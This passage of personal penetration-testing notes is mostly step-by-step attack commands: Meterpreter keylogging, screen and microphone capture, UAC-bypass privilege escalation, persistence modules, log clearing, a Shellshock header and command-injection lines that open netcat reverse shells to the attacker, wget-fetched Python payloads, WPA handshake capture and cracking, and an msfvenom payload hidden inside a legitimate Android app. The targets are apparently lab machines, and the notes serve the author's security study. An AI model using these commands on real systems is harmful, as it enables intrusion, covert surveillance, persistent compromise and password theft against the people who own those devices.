        > shell (execute cmds straight into the target machine by which it opens a SSH like remote terminal)
        > arp (displays the arp table)
        > netstat (prints all connections target machine has[Here we can see that target has established a connection to the attacker's listener])

        following are some system commands:
        > execute -f <application_name> (<application_name> = calc, this also returns to executed file's process id)
        > ps (list all files running on the target machine)
        > kill <PID> (the PID can be found out from the ps table in the PID column)
        > reboot, shutdown
        > sysinfo (additional info about the target machine)
        > mouse (move mouse to specific location (Usage opens which is S.E.))
        > keyscan_start (starts keylogging)
        > keyscan_dump (dumps sniffed keys recorded so far)
        > keyscan_stop (stops keylogging)
        > screenshot (snaps screenshots of target machine)
        > screenshare (live screen sharing of target machine)
        > record_mic -d <record_seconds> (record sound from target machine's microphone)

ELEVATE PRIVILEGE USING MSFC(elevating modules are present under local msfc hierarchy in exploit/):
        this is performed specifically after we created a meterpreter session with a windows 10 PC but applies the same for other OS platforms as well
        use the following cmd(here we'll just fuzz through different search keywords):
        since we're performing a post exploitation the type of exploit would be under the local folder(i.e. msf module folder hierarchy) 
        make sure when performing this exploit execution the active meterpreter session of target system must be running/at bg
        > search bypassuac (UAC - user account control)
        > search 2020
        from above search result lets try using: windows/local/cve_2020_0796_smbghost
        > windows/local/cve_2020_0796_smbghost
        in 'show info' we can check what sort of target it supports for that exploit
        'show options' wants a param called SESSION to be set and it is nothing but the meterpreter session we created with the windows PC that was compromised
        so to set it we do:
        > set SESSION <session_Id>
        > run (THIS WAS A FAILURE SO WE'LL TRY ANOTHER ONE)
        another exploit we found out from 'search 2020' and to use it:
        > use exploit/windows/local/cve_2020_0668_service_tracing
        > set SESSION <session_Id>
        > set LHOST <attacker's_ip>
        > set LPORT <attacker's_port> (make sure that you enter a different port number from the one you created already to exploit the target machine. use 'sessions' cmd and know the already opened ports in attacker's PC)
        > run (THIS WAS A FAILURE SO WE'LL TRY ANOTHER ONE)
        another exploit we found out from 'bypassuac' and to use it:
        > use exploit/windows/local/bypassuac_fodhelper
        (just before bruteforcing through all exploits that are listed in the search result make sure to read info at the search table and what it does using 'show info')
        > set SESSION 1
        > run (THIS WAS A SUCCESS)
        Even though we get back a meterpreter session with the exploit on cmd 'getuid' we are still a normal user and not root level user
        because the exploit info says that it will spawn a second shell (SESSION 2) with UAC turned off
        so previously from the system commands in msfc we would have tried the cmd 'getsystem' for elevating privilege which didn't work but now after executing this exploit
        if we run 'getsystem' it returns the following:
        ... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). now do 'getuid' it returns 'NT AUTHORITY/SYSTEM'
        (in my case (windows 7 x64) exploit/windows/local/bypassuac was used for privilege escalation)

CREATING PERSISTENCY ON THE TARGET SYSTEM USING MSFC(persistence modules are present under local msfc hierarchy in exploit/):
        after we've compromised the target machine and then elevated our privileges in now we need to create a persist connection with it even when the victim restarts/reboots the system
        so make sure we currently have 2 session running where:
        SESSION 1 being the payload the user executed on behalf of us/or with the help of an exploit
        SESSSION 2 being the privilege elevation
        we can search for the foll in msfc:
        > search persistence (keyword used for searching persistence modules in msfc)
        from the result we'll use:
        > use exploit/windows/local/persistence/persistence_service
        > show info (read the description to know what the exploit would do)
        now in 'show options' we need to set a SESSION, so make sure to set it with the escalation session we performed previously(SESSION 2) as follows:
        > set SESSION 2
        > set RETRY_TIME 10 (use 'show options' to know this)
        > run
        now we get a meterpreter session running, but what's special is that it will automatically connect even if target's PC is restarted/rebooted since we ran the persistence module in msfc we can test it out by using:
        > reboot (in meterpreter session that was created the 3rd time)
        now we can close all and reopen msfc and use:
        > use exploit/multi/handler
        and set options for it like we did earlier (LHOST of attacker_ip, and LPORT of attacker_port i.e. SESSION 2's port number because we used the persitence module upon SESSION 2 (set SESSION 2))
        what happens in the target's machine after switching on is that it tries to connect to our attacker's PC which has been listening to port X and returns a shell
        the best part in this is that we don't need to repeat the whole process of elevating privilege so on to stay where we left off
        (in my case (windows 7 x64) exploit/windows/local/persistence_service was used for persistency, the location of the service is found at "C:\Users\win7\AppData\Local\Temp\TqIp.exe" using the cmd "wmic process")

since we're in post exploitation we can use post/windows to search for all post exploit modules related to windows:

POST MODULES & MISC:
        eg: use post/windows/gather/checkvm (modules that check whether target is VM or Physical PC)
        eg: use post/windows/wlan/wlan_profile (modules that check whether target is VM or Physical PC)
        eg: use post/windows/gather/hashdump (gives all hashes of the users on the target windows machine)
        to perform the above ones within the meterpreter shell use the foll:
        eg: > run post/windows/gather/enum_applications (prints all installed application in the target's windows machine)

OTHER USEFUL METERPRETER CMDS:
        > search -h (shows different usage of search techniques to search for specific file types in target system)
        eg: search -f *.<file_extension> (for searching types of files in the target system)
        > clearev (clears system and security logs) (SIMILAR TO COVERING TRACKS)






********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************




____________________________________________________________________
WEB APP PENETRATION TESTING
____________________________________________________________________

INFORMATION GATHERING:
similar to the chapter 1 but mostly related to web applications


--> (dirb) we'll use a tool called dirb in kalinux that helps to enumerate all possible routes in a webpage, we'll use metasploitable 2.0 for demonstration purpose and we execute dirb as foll:
        > dirb http://<metasploitable_VM_ip> (this will search for different subdirectories)
        normally dirb uses its own wordlist to enumerate webpage directories or we can even use our own wordlist if we want to
        (try experimenting with different tools that might be better than this one)

--> (burpsuite) this application allows us to intercept and take a look at incoming http/s requests, modify it and forward it to our target(kind of like a forward proxy)
        this is preinstalled in kalilinux inside the web app analysis section. at initial startup select default options and next to rush through the application homescreen
        also we need to configure our firefox browser in kalilinux to use it as a proxy
        first click on the [PROXY] tab and under it click on options tab
        now click on the interface 127.0.0.1:8080 and click edit
        make sure the bind to address is set to loopback only
        now in firefox open this link- about:preferences (preferences from option menu)
        under general go to network settings and click 'settings' and under 'configure proxy access to the internet' select manual proxy configuration and set the following:
        HTTP proxy: 127.0.0.1:8080 (check 'use this for all protocols')
        also make sure that SOCKS v5 is selected
        now if we try to request a webpage firefox says that it doesn't trust our burpsuite tool
        normally this restriction happens if we proxify https connection due to the certification process involved with the security mechanisms in browsers and this is not an issue with http websites
        goto: http://burp and click on CA certificate to download a certificate(cacert.der) which we can then import to firefox and make it trust the burpsuite app. 
        so after downloading it goto about:preferences and to privacy & security and scroll to certificates section then click view certificates and click 'import'
        browser the .der we downloaded and check both Trust misc options
        now if we try to request a webpage it keeps loading, and a window redirection happens towards burpsuite which highlights intercept tab under the proxy tab which says that there's a request that's been captured by burpsuite,
        where the intercept is turned on(we can see a button saying 'Intercept turned on')
        we can forward the request manually by pressing the 'forward' button or just unclick the 'Intercept turned on' button to unintercept the requested webpage
        we can see the pages that was request under the [TARGET] tab under site map tab
        NOTE: when using the above firefox configured for normal usage it redirects your webpage request to burpsuite even though you didn't intend to be using it, so
        switch off burpsuite's intercept mode or
        disable proxy in firefox settings

        [VIDEO (ShellShock Exploitation)] https://pentesterlab.com/exercises/cve-2014-6271/iso  --> (referring this vm as shellshock_vm)
        for this exploitation we'll install a linux vm specific to this exploitation for demonstration
        start up burpsuite for executing the attack and for now switch off the intercept
        start up the shellshock_vm and enter ifconfig to know the ip address
        then in the attacker machine enter the ip and after getting response from the webpage goto burpsuite's target tab and then to sitemap to see the retrieved webpages
        from there we get a page with URL called /cgi-bin/status, click it and see the json response we get which has a key called 'kernel' and its value is similar to the output we get from 'uname -a' and it is run by bash.
        you can notice that the request that we sent consists of a http header called User-Agent which is actually an environmental variable when processed inside of a cgi script but straight off we couldn't attach a cmd in the User-Agent header since this vulnerability is based on first specifying an empty bash function [ () { :;}; ] then the commands that comes after it
        now we can send the above empty function with the User-Agent header.
        for this purpose we'll use the burpsuite's [REPEATER] option but first in the sitemap tab inside target tab we need to select the specific request we want to repeat, so we right click and click 'Send to repeater', which forwards the request to the Repeater tab under tab number 1.
        over there we can enter the following header value for User-Agent(before running the following make sure the attacker's port(listener) is switched on with the cmd 'nc -lvp <attacker's_listener_ip>'):
        User-Agent: () { :;}; /bin/bash -c 'nc <attacker's_ip> <attacker's_listening_port> -e /bin/bash' (the command used creates an empty bash function and then executes the /bin/bash that has a flag -c (command execution) which executes nc that connects to attacker's ip and port and a -e(similar to -c flag in /bin/bash) flag that opens a shell to the ones we're connecting with i.e. the attackter's pc)
        The one I tried: () { :;}; /usr/bin/nc 192.168.1.13 443 -e /bin/bash
        NOTE: some linux distros having netcat preinstalled doesn't have the flags -e & -c due to security issues
        now click send to forward the request to the target machine and now if we go to our attacker's nc listener we created a shell session /w the help of the shellshock exploit
        Also the above process could be automated with the help of msfc
        > search shellshock
        > use exploit/multi/http/apache_mod_cgi_bash_env_exec
        set RHOSTS to the target machine's ip
        > set TARGETURI /cgi-bin/status
        > run
        EXTRAS: nc revshell without e flag - https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99

        [VIDEO (LoginPage Bruteforcing)] METASPLOITABLE 2.0
        for brute forcing a login page we'll be using a feature in burpsuite called [INTRUDER].
        for this lets setup burpsuite and switch intercepter off along with metasploit's dvwa login page and enter a sample user:pass that doesn't need to be valid
        now after triggering a request goto burpsuite's target tab and under sitemap tab we can find the request we initiated
        now right click on the specific webpage in which we sent our user:pass and click send to intruder which makes the intruder bar light up
        within that we can goto positions tab we can see the request that we just sent as well as we can see the attack type drop down above the request
        some options in it are meant to be as follows:
                Cluster bomb - bruteforce both username(m) and password(n) at the same time (m*n combinations)
                Sniper - bruteforce username(1) and password(n) (1*n combinations)
        here automatically see that few fields are surrounded by a special character '§'
        this selection is to indicate which fields would be bruteforced. for now we can clear the selections with the clear button at the right and highlight and select the username and password field(only the value and not the key) that we want to bruteforce and click Add button at the right
        then to the payload section we see payload set under payload sets section, there we select 1 for username bruteforce configuration and 2 for password configuration
        the payload type to be a 'simple list', and under payload option we'll load the list by browsing and selecting the list we created(a text file with every password placed vertically)
        we do the same for both payload set 1(username) & 2(password)
        finally we can click on start attack button to the right
        now a scan starts to happen for the different combinations of usernames and password and within the result tab we can see a column called length. that shows the response html page's length
        in this case we get a redirection to a different page (status 302) but in burpsuite we need to enable redirection so for that in intruder tab > options tab under Redirections check Always and start the attack once again
        now we can see a variable length of html page's length as response which indicates some of our combinations were correct and checkout them
        FOR MORE: https://portswigger.net/burp/documentation/desktop/tools/intruder/positions

[VIDEO (Command Injection)] METASPLOITABLE 2.0
to start this payload execution first we need to get to metasploitable 80 port into dvwa
login with default username and password
we'll try with 2 different levels of security level(to toggle between click on dvwa security tab and from the drop down change it)
then goto command execution tab to start the execution
        1. Security Level - low:
                this following page allows to ping a host by entering an ip address where we might try a command like:
                192.168.1.13; ls -al (here we've entered the ip address and also an unintended command we've attached after the semicolon)
                this returns us both the ping result and also the list command's output. so with this vulnerability we can use the following code to create a remote shell using nc as follows:
                192.168.1.13; nc <attacker_ip> <attacker_listeners's_port> -e /bin/bash
                also make sure that revshell is opened in attacker's PC
                The reason why this vulnerability is present is due to no filtering/input validation is done in the code side
        2. Security Level - medium:
                here if we try to above cmd 192.168.1.13; ls -al it doesn't work but appending command to the end can be done in other ways also using the following symbols:
                192.168.1.13 && nc <attacker_ip> <attacker_listeners's_port>
                192.168.1.13 & nc <attacker_ip> <attacker_listeners's_port>
                192.168.1.13 | nc <attacker_ip> <attacker_listeners's_port>
                now from the above given types & and | works and the reason is that in the code side, filtering of && and ; is only done but not for all the other possibilities
        3. Security Level - high:
                this ain't vulnerable since the input validation is done in a way where the 4 octets of the ipv4 address provided are checked individually else if other strings are present it returns an error msg

        [EXTRA (MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)] (foll. talks about creating a python payload with msfv upload it in the vulnerable website by hosting the payload in a python server, set revshell with msfc and trigger the payload with the found vulnerability)
        Now instead of using the nc revshell we did for executing the payload we can use msfc which provides us much more shell features
        so to create a meterpreter session first we need to create a payload with msfvenom.
        since we know that our target machine is a linux32(metasploitable2.0) we can create a python reverse_tcp payload, also the reason why we use python is that most linux systems has python preinstalled so we don't have to install any additional softwares to make our payload run. We create it as follows:
        > msfvenom -p python/meterpreter/reverse_tcp LHOST=<listening_attacker_ip> LPORT=<attacker_listening_port >> <filename>.py
        now since we need the target to make it download the payload we created we can host an apache webserver so that it downloads from it as follows:
        > sudo service apache2 start (to start the apache2 web server)
        now to host the payload we can move the payload to /var/www/html/
        (also we could use python server by using the command: python3 -m http.server <attacker_listening_port> (make sure to run this relative to the payload's location))
        and now the way how we exploited the webpage's input field using: 192.168.1.13; nc <attacker_ip> <attacker_listeners's_port> -e /bin/bash'
        now instead we need make the payload downloaded by the target itself so we use 'wget' cmd as follows:
        > 192.168.1.13; wget <apache2_webserver's_ip|attacker's_webserver_ip>/<payload_name>.py
        now if we perform the ls in the input field we'll see the file we uploaded
        then we start setting up the listener in msfc as follows:
        > use exploit/multi/handler
        > set payload python/meterpreter/reverse_tcp
        set LHOST, LPORT similar to the one given when creating the payload using msfv
        > run
        now if again go back the the input field and execute the following:
        > 192.168.1.13; python <payload_name>.py (the browsers keeps loading but target machine has already started a meterpreter session with the attacker's PC)

TODO: [VIDEO (XSS)] METASPLOITABLE 2.0
TODO: [VIDEO (SQL INJECTION)] METASPLOITABLE 2.0
TODO: [VIDEO (CSRF)] METASPLOITABLE 2.0
TODO: [VIDEO (Hydra Bruteforcing)] METASPLOITABLE 2.0



____________________________________________________________________
MAN IN THE MIDDLE
____________________________________________________________________

ARP SPOOFING:
in a network basically when requesting a page routers used to have routing tables and arp tables that helps retrieving the webpage and keeping track of who requested is done by the arp table(consists of arp requests(when a device wants a mac for given ip) and responses) by mapping the local ip to device's mac address, this is how routing works, but
in man in the middle where u tend to be the router where victim after poisoning arp (this means the attacker literally messes up with the arp table saying that he's the router by sending arp responses to the victims connected to the network), they send you the request that need to be sent to the router but we are the router and so forward packets as if they were forwarded by the victim and router returns the result to the attacker

[TODO: Bettercap]
[TODO: Ettercap]
[TODO: Scapy]

____________________________________________________________________
WIRELESS ACCESS POINT CRACKING
____________________________________________________________________

here <wireless_interface_name> denotes the wireless card's name in attacker's PC

Switch wifi card to monitor mode:
first check whether wifi card supports monitor mode and type the following command:
> iwconfig (this shows whether wificard is running and at which mode)
to switch first we need to switch off the card from being in managed mode and then change the mode to monitor then turn up the card as follows:
> sudo ifconfig <wireless_interface_name> down
> sudo iwconfig <wireless_interface_name> mode monitor
> sudo ifconfig <wireless_interface_name> up
now if we try '> ifconfig' we must get the mode of the wifi card as monitored
sometimes we get disconnected from the internet and we get back to managed mode itself but redo the above steps to bring it back to monitor mode

(airmon-ng) AIRMON-NG for Deauthenticating Devices from wireless AP(Access Point) and grabbing nonhashed/hashedpassword:
NOTE: following monitoring process didn't show 5GHz router channels
first set attacker's wifi card to monitor mode like we did in the previous section
then using airmon-ng we can check whether what all services might cause trouble with our wifi cracking as follows:
> airmon-ng check <wireless_interface_name>
if case we get any process, to kill them:
> airmon-ng check kill 
after killing make sure whether we've gone again to the managed mode by using '> iwconfig' and if yes then rerun the previous section's commands 
we can also set to monitor mode using airmon-ng as follows:
> airmon-ng start <wireless_interface_name> (this adds a suffix to the <wireless_interface_name> as <wireless_interface_name>mon )
now to start dumping all the wireless access points and their info:
> airodump-ng <wireless_interface_name>|<wireless_interface_name>mon 
from the dumped info there are some column definitions we need to know about:
        ESSID - names of wireless access points
        AUTH,CIPHER,ENC - type of protection the wireless AP has
        CH - Wireless AP's Channel
        DATA - tells whether the AP is active currently or in other words whether any connected devices are accessing the internet
        PWR - how far the AP is (lower the no. closer the access point and viceversa [NOTE: if the AP is pretty far the attack might not work]) 
now ctrl+c after collecting enough information of the AP you want to attack, make sure to remember the channel and the mac address
now we need to start sniffing process specific to the bssid(AP) and write sniffed information such as the AP handshake etc as follows:
> airodump-ng -c <AP's_channel> --bssid <MAC_address_of_AP> -w <sniffed_output_filename> <wireless_interface_name>|<wireless_interface_name>mon
now we can see 2 different tables showing info about the AP (column 1) & the devices connected to it(column 2)
we can now perform a Deauthentication attack to the AP so that all the users connected to the wifi will be disconnected and when we stop the deauth process, users try connecting again a handshake happens where the hash of the password is sent by the normal user to the AP
at that time airodump-ng captures the handshake info which we need the most. so to do deauth:
> aireplay-ng -0 0 -a <MAC_address_of_AP> <wireless_interface_name> (means send deauth packets indefinitely)
deauth packets are sent until we ctrl+c the above cmd and nobody will be able to connect to the AP
after capturing the handshake stop the dumping process and we can now use the capfile (<sniffed_output_filename>) to further our cracking process
for that we can now use aircrack-ng to perform the cracking as follows:
> aircrack-ng -w <dictionary_file>.txt <sniffed_output_filename>.cap
for dictionary_file we already have a password dictonary present in kalilinux called rockyou.txt which is present in a zip file where we can extract(gzip -d rockyou.txt.gz) an use it('locate rockyou.txt' gives you the location) or
we can use our own dictionary file i.e. a txt file with password 1/line
in case we get the password it shows: ' KEY FOUND! [ <the_password_found> ] '
Now due to the service kill(Network Manager) we performed at the start, your internet might not work
so to make it work we need to start the NetworkManager service. to start it:
> sudo service NetworkManager start 

(hashcat) HASHCAT for cracking password /w adv. feats:
hashcat --help for all possible features that can be used
In our case the type of password hash we want to crack is WPA-EAPOL-PBKDF2 having a code 2500 which can be found out from the hashcat help menu
-m type of password hash we want to crack (the option's value is the code we mentioned above)
-a option is the attack mode that we can customize the CPU power consumption (lower-0, higher-3)
NOTE: hashcat doesn't support .cap file we need to convert it to .hccapx (use this link for online conversion: https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php)
so to execute:
> hashcat -a 0 -m 2500 <hccapx_file>.hccapx <dictionary_file>.txt
now during the runtime it doesn't show any type of progress bar rather it shows status, pause, bypass, checkpoint, quit options with first character of each word as action
from which we can check intermediate info about the ongoing cracking process
after finding the password it displays the <hash>:<AP's_name>:<password_in_plain_text>

EXTRAS: https://github.com/FluxionNetwork/fluxion 


____________________________________________________________________
ANDROID HACKING
____________________________________________________________________

Creating a meterpreter session in target android phone:
> msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -o <filename>.apk
now to listen to the target in msfc:
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
set LHOST and LPORT
> run

EvilDroid(quick and dirty way of creating payload and cleaning stuffs from target's android phone) - https://github.com/M4sc3r4n0/Evil-Droid
extract and install it in kalinux
we'll create a regular payload as follows:
Select>: 1 (APK MSF)
a popup to set attacker's ip, attacker's port, apk filename payload type
then ok, now it gives an option whether to start the multi-handler(similar to the one we start a listener in msfc) so we'll select it
and output'll be present in the relative evildroid folder
now after the attack and misc been done with the payload we can close the session and also all respective services will be closed that start when we ran the evildroid application

Masquerading legit apk with msfvenom(try the following with a root account):
for this we've downloaded flappybird1.3.apk file from the internet
> msfvenom -x <downloaded_apk_file>.apk -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_listening_port> -o <output_file_name>.apk
if the above didn't go well follow the github repo to install apktool: https://ibotpeaches.github.io/Apktool/install/
send the above apk to the target android phone with a python server or apache2


[FOLLOWING METHOD DID'T WORK DUE TO UNKNOWN ISSUES]
____________________________________________________________________
NGROK FOR CREATING A PUBLIC URL
____________________________________________________________________
download link: https://ngrok.com/download
ngrok is a utility that allows port forwarding from ngrok public servers to our local server
NOTE: free version of ngrok the port number changes everytime we close and run the application
to execute use the cmd as follows:
> ./ngrok tcp <port_number>
on executing this we see that we get a forwarding message section with the domain&hostname:port (here assume the port as <ngrok_port) of the online ngrok server port forwarding to our localport
now we can use this to host our payloads online and to create them is as follows:
but first we need to resolve the dns for the given domain&hostname i.e. if the assigned domain&hostname is 4.ngrok.io and port 12345 from the forwarding message section we can use a cmd as follows:
> host <assigned_domain&hostname_by_ngrok> (returns the public ip address of the ngrok server) 
now consider the above ip address output as <ngrok_aip>
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ngrok_aip> LPORT=<ngrok_port> -f exe -o shell.exe (for winx64) 
> msfvenom -p android/meterpreter/reverse_tcp LHOST=<ngrok_aip> LPORT=<ngrok_port> -f apk -o shell.apk (for android) 
now we need to setup a local listener where the ngrok server port forwards the request to our router's public ip and then to our msfc
> msfconsole
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp (for windows)
> set payload android/meterpreter/reverse_tcp (for android)
> set LHOST 0.0.0.0 (0.0.0.0 means listen on any interface whatsoever)
> set LPORT 5555
> run
